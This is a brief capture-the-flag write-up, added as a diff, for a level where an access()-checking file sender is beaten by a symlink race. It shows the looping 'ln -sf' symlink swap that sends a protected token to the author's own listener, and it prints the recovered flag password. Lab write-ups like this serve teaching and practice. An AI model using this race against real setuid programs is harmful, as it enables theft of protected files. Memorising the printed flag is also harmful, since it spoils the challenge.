@@ -1,0 +1,24 @@
+program wants file and ip of the host
+./level10 file host
+	sends file to host if you have access to it
+and listens on port 6969
+ltrace showed that program uses access which is a vulnurable way to protect yourprogram
+
+from man:
+Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a secu‐
+       rity hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this  reason,
+       the  use  of  this  system  call  should be avoided.  
+
+i created a ruby server to sit on 6969 port and recieve message
+
+than i created bash script which is constantly creating two sym links:
+ln -sf ~/level10 /tmp/exploit
+ln -sf ~/token /tmp/exploit
+
+
+than i launched ./level10 /tmp/exploit ip in infinite loop:
+so i needed to get in place where level10 rights were assigned to /tmp/exploit
+but content of tmp/exploit was actually ~/token
+
+then i got junk and finally got passwd to flag10: woupa2yuojeeaaed06riuj63c
+
